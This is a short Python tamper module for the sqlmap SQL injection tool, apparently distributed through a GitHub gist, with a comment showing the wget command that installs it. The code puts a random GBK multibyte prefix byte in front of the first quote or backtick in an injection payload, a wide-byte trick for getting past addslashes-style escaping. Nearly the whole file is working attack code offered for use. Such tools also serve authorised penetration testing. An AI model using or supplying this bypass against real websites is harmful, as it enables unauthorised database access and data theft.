#!/usr/bin/env python
#coding:utf-8
# v10
# ┌──(unk9vvn㉿e1l1ya)-[~]
# └─$ wget https://gist.githubusercontent.com/unk9vvn/d8607bd95283b1c9d3c137dcaa7b0a3c/raw/7d520d3ec206435d5882cb2930eb442543623716/gbk.py -O /usr/share/sqlmap/tamper/gbk.py

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""


from lib.core.data import kb
from lib.core.enums import PRIORITY
import random

__priority__ = PRIORITY.NORMAL

GBK_Prefix = ['%ef','%df','%bf','%a8','%8c']


def dependencies():
	pass


def tamper(payload, **kwargs):
	global GBK_Prefix
	retVal = ""
	if payload:
		first = False
		for i in payload:
			GBK_Payload = GBK_Prefix[random.randint(0,4)]
			if i == "'" and not first:
				retVal += GBK_Payload+"'"
				first = True
			elif i == '"' and not first:
				retVal += GBK_Payload+'"'
				first = True
			elif i == '`' and not first:
				retVal += GBK_Payload+'`'
				first = True
			else:
				retVal += i
		return retVal
